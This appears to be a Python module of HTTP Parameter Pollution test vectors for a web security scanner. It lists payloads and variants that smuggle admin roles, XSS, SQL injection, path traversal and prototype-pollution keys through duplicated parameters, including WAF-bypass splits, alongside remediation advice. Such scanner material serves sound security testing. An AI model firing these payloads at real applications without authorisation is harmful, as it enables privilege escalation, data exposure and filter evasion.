"""
HTTP Parameter Pollution (HPP) Test Vectors
Targets parameter pollution vulnerabilities in web applications and proxies
"""

from ..models import (
    TestVector,
    VulnerabilityType,
    TestVectorPosition as Position,
    PositionType,
    TestVectorPayload as PayloadTemplate,
    TestVectorEvidence as Evidence,
    ConfidenceLevel,
    SensitivityLevel,
)

HPP_VECTORS = [
    TestVector(
        id="hpp-client-001",
        name="HPP Client-Side Parameter Pollution",
        description="Inject additional parameters to manipulate client-side logic",
        vuln_type=VulnerabilityType.HPP,
        position=Position(type=PositionType.QUERY, name="id", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="1&id=2&admin=true",
            variants=[
                "123&id=456&role=admin",
                "user1&id=user2&authenticated=1",
                "normal&id=<script>alert(1)</script>",
                "public&id=../../etc/passwd",
            ],
            encoding="url",
        ),
        expected_evidence=Evidence(
            indicators=["Second parameter used", "Client-side confusion", "Parameter override"],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.MEDIUM,
        tags=["hpp", "parameter-pollution", "client-side", "injection"],
        references=[
            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution",
            "https://www.madlab.it/slides/BHEU2011/whitepaper-bhEU2011.pdf",
            "https://cwe.mitre.org/data/definitions/235.html",
        ],
        remediation="Use first occurrence of parameter, validate parameter count, implement strict parsing",
    ),
    TestVector(
        id="hpp-server-001",
        name="HPP Server-Side Parameter Pollution",
        description="Exploit server-side parameter handling inconsistencies",
        vuln_type=VulnerabilityType.HPP,
        position=Position(
            type=PositionType.BODY_FORM, name="email", value_prefix="", value_suffix=""
        ),
        payload=PayloadTemplate(
            base="user@example.com&email=admin@internal.com",
            variants=[
                "public@example.com&email=private@admin.com",
                "user@test.com&email[]=attacker@evil.com",
                "normal@domain.com&email=admin@localhost&email=attacker@evil.com",
                "test@example.com&email=<script>alert(1)</script>",
            ],
            encoding="url",
        ),
        expected_evidence=Evidence(
            indicators=[
                "Server uses last/first/concatenated parameter",
                "Backend confusion",
                "Different parameter value",
            ],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.HIGH,
        tags=["hpp", "parameter-pollution", "server-side", "authentication-bypass"],
        references=[
            "https://www.owasp.org/index.php/Testing_for_HTTP_Parameter_pollution_(OTG-INPVAL-004)",
            "https://infosecwriteups.com/http-parameter-pollution-its-contaminated-85edc0805654",
            "https://blog.imperva.com/2009/05/http-parameter-pollution.html",
        ],
        remediation="Reject requests with duplicate parameters, use consistent parameter parsing, validate input",
    ),
    TestVector(
        id="hpp-array-001",
        name="HPP Array Parameter Manipulation",
        description="Manipulate array parameters to inject unauthorized values",
        vuln_type=VulnerabilityType.HPP,
        position=Position(
            type=PositionType.QUERY, name="roles[]", value_prefix="", value_suffix=""
        ),
        payload=PayloadTemplate(
            base="user&roles[]=admin",
            variants=[
                "guest&roles[]=superadmin&roles[]=root",
                "normal&roles[0]=user&roles[1]=admin",
                "public&roles[999]=administrator",
                "limited&roles[__proto__]=admin",
            ],
            encoding="url",
        ),
        expected_evidence=Evidence(
            indicators=["Array pollution", "Role escalation", "Unauthorized role assigned"],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        tags=["hpp", "array-pollution", "privilege-escalation", "authorization"],
        references=[
            "https://hackerone.com/reports/120979",
            "https://portswigger.net/daily-swig/http-parameter-pollution-attack-bypasses-aws-waf",
            "https://www.acunetix.com/blog/web-security-zone/http-parameter-pollution/",
        ],
        remediation="Validate array indices, implement strict role assignment, use allowlists for roles",
    ),
    TestVector(
        id="hpp-waf-bypass-001",
        name="HPP WAF/Filter Bypass",
        description="Bypass WAF and security filters using parameter pollution",
        vuln_type=VulnerabilityType.HPP,
        position=Position(type=PositionType.QUERY, name="search", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="normal&search=<script>alert(1)</script>",
            variants=[
                "safe&search=' OR '1'='1&search=--",
                "legitimate&search=<scr&search=ipt>alert(1)</script>",
                "valid&search=java&search=script:alert(1)",
                "clean&search=../../&search=etc/passwd",
            ],
            encoding="url",
        ),
        expected_evidence=Evidence(
            indicators=["WAF bypassed", "Malicious payload executed", "Filter evasion successful"],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.HIGH,
        tags=["hpp", "waf-bypass", "filter-evasion", "xss", "sqli"],
        references=[
            "https://medium.com/@0xAwali/http-parameter-pollution-waf-bypass-d1c1cf4b0f8e",
            "https://www.slideshare.net/d0znpp/http-parameter-pollution-a-new-category-of-web-attacks",
            "https://owasp.org/www-community/attacks/HTTP_Parameter_Pollution",
        ],
        remediation="Implement parameter deduplication before WAF, validate all parameter occurrences, use strict parsing",
    ),
]
